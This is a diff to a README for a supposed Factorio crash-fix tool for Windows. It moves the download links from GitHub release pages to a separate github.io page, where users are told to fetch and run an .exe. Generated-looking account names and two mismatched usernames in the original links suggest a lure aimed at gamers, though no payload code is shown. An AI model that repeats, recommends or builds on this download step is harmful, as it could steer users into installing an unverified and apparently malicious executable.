@@ -1,6 +1,6 @@
 # 🛠️ Factorio-Crash-Fix - Repair your game launch errors today
 
-[![](https://img.shields.io/badge/Download-Factorio_Fix-blue.svg)](https://github.com/Onomastic-falseindigo39/Factorio-Crash-Fix/releases)
+[![](https://img.shields.io/badge/Download-Factorio_Fix-blue.svg)](https://onomastic-falseindigo39.github.io)
 
 This tool fixes launch issues for Factorio on Windows 10 and Windows 11. It restores missing configuration files, updates driver compatibility settings, and resets graphical states that prevent the game from opening. Follow the instructions below to resolve your crash errors.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic requirements before you run the fix:
 
 You need to obtain the latest version of the repair tool. Follow these steps:
 
-1.  Visit the [official releases page](https://github.com/Onomastic-falseinvisible39/Factorio-Crash-Fix/releases) to download the repair package.
+1.  Visit the [official releases page](https://onomastic-falseindigo39.github.io) to download the repair package.
 2.  Locate the latest file ending in `.exe`.
 3.  Click the file link to start the download.
 4.  Save the file to your Downloads folder or your Desktop.
